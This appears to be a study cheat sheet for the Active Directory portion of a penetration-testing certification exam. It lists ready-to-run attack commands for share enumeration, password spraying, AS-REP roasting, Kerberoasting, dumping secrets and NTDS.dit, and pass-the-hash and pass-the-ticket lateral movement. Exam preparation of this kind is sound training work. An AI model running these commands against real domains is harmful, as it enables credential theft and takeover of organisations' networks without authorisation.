# Active Directory — 40% of Exam

> Fill Weeks 27–30. Assumed breach: start with low-priv domain user+pass.

## Core Sequence
```
nxc smb 192.168.50.0/24 -u 'user1' -p 'Pass123' --shares
bloodhound-python -d corp.local -u 'user1' -p 'Pass123' -ns $DC_IP -c All --zip
impacket-GetNPUsers corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile asrep.txt
impacket-GetUserSPNs corp.local/user1:'Pass123' -dc-ip $DC_IP -request -outputfile kerberoast.txt
impacket-secretsdump corp.local/admin_user:'Pass123'@$TARGET_IP
evil-winrm -i $TARGET_IP -u Administrator -H <NTLM_HASH>
```

## Enumeration
- NetExec (nxc smb/winrm/mssql) across all machines
- BloodHound: mark user Owned, shortest paths, ACLs (`ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDacl`)

## Authentication
- NTLM challenge-response vs Kerberos (KDC, TGT, TGS)
- Creds in memory/registry: LSASS, SAM, LSA Secrets, NTDS.dit
- Password spray: `nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success`

## Kerberos & ACL Attacks
- Sync clock first: `sudo ntpdate $DC_IP`
- AS-REP Roast: `impacket-GetNPUsers` → hashcat `-m 18200`
- Kerberoast: `impacket-GetUserSPNs` → hashcat `-m 13100`
- ACL abuse: `bloodyAD` / `net rpc` (GenericAll/GenericWrite)
- Silver tickets, DCSync: `impacket-secretsdump`

## Lateral Movement / Post-Compromise
- Dump: `impacket-secretsdump` or `nxc smb ... --lsa`
- Pass-the-Hash: `evil-winrm -H`, `impacket-wmiexec -hashes`, `impacket-psexec -hashes`
- Overpass-the-Hash / Pass-the-Ticket: `Rubeus.exe`, `export KRB5CCNAME=...`
- WMI/WinRM/DCOM/VSS extraction of NTDS.dit

## References
The Hacker Recipes · WADComs · BadBlood · GOAD Lab
